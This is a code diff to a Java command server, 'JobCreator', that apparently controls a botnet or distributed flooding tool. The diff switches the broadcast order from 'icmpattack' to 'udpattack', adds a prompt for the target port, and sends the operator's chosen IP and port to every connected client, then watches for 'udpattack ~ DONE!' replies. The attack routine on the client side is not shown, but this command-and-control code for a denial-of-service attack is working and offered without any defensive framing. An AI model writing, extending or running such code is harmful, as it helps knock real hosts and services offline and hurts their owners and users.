@@ -59,7 +59,7 @@ public class JobCreator {
 					connections.get(clId).os.println(t); //sending task prompt
 					connections.get(clId).os.flush();
 				}
-        else if(choi == 3) 
+        else if(choi == 3)
         {
           System.out.println("Enter IP address to send to client: ");
           String df=br.readLine();
@@ -127,10 +127,13 @@ public class JobCreator {
       {
         System.out.println("Enter IP address to send to client: ");
         String df=br.readLine();
+        System.out.println("Enter the port number to send to the client: ");
+        int dff=Integer.parseInt(br.readLine());
         for(int index=0;index<connections.size();index++)
         {
-          connections.get(index).os.println("icmpattack");
+          connections.get(index).os.println("udpattack");
           connections.get(index).os.println(df);
+          connections.get(index).os.println(dff);
           connections.get(index).os.flush();
         }
         menu();
@@ -267,7 +270,7 @@ class ServerThread extends Thread{
       {
         isFree=true;
       }
-      if(line.equals("icmpattack ~ DONE!"))
+      if(line.equals("udpattack ~ DONE!"))
       {
         isFree=true;
       }
